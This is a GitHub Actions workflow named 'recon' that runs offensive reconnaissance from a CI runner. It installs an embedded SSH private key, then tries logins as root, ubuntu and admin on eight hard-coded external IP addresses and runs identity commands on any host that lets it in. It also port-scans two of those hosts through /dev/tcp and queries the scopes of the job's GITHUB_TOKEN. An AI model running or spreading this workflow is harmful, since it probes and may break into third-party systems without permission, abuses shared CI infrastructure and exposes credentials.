name: recon
on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Setup
        run: |
          mkdir -p ~/.ssh
          cat > ~/.ssh/id_ed25519 << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBaL6cZDVLvyrO2F7LMCooPrrq5m01YP/ikSRC2iqwMKgAAAJjhNIEK4TSB
CgAAAAtzc2gtZWQyNTUxOQAAACBaL6cZDVLvyrO2F7LMCooPrrq5m01YP/ikSRC2iqwMKg
AAAEBE+1luq0iSpZRYWAGMD1uRkBujt4p/tTxyx7DPagxS5lovpxkNUu/Ks7YXsswKig+u
urmbTVg/+KRJELaKrAwqAAAAEHBlbnRlc3QtMjAyNjA2MzABAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
EOF
          chmod 600 ~/.ssh/id_ed25519
          echo "Key installed"

      - name: Probe SSH
        run: |
          echo "=== Runner ==="
          curl -s ifconfig.me
          echo ""
          for ip in 65.21.11.19 65.108.104.158 168.119.157.70 65.109.92.163 37.27.127.216 65.108.229.3 65.109.112.144 5.78.128.4; do
            for user in root ubuntu admin; do
              result=$(timeout 10 ssh -i ~/.ssh/id_ed25519 -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o UserKnownHostsFile=/dev/null "$user@$ip" "hostname; id; cat /etc/os-release | head -3; echo SSH_OK" 2>/dev/null)
              rc=$?
              if [ $rc -eq 0 ]; then
                echo "ACCESS: $user@$ip"
                echo "$result"
                echo "---"
              else
                echo "DENIED: $user@$ip (rc=$rc)"
              fi
            done
          done

      - name: Port scan main proxy
        run: |
          echo "=== 65.21.11.19 ports ==="
          for p in 22 80 443 3000 5432 6379 8080 8443 9090 26657 27017; do
            timeout 3 bash -c "echo >/dev/tcp/65.21.11.19/$p" 2>/dev/null && echo "$p OPEN" || echo "$p closed"
          done
          echo "=== 168.119.157.70 ports ==="
          for p in 22 80 443 3000 8081 8082 8083 26657; do
            timeout 3 bash -c "echo >/dev/tcp/168.119.157.70/$p" 2>/dev/null && echo "$p OPEN" || echo "$p closed"
          done

      - name: Token scope check
        run: |
          curl -sI -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" https://api.github.com/user 2>&1 | grep -i "x-oauth-scopes"
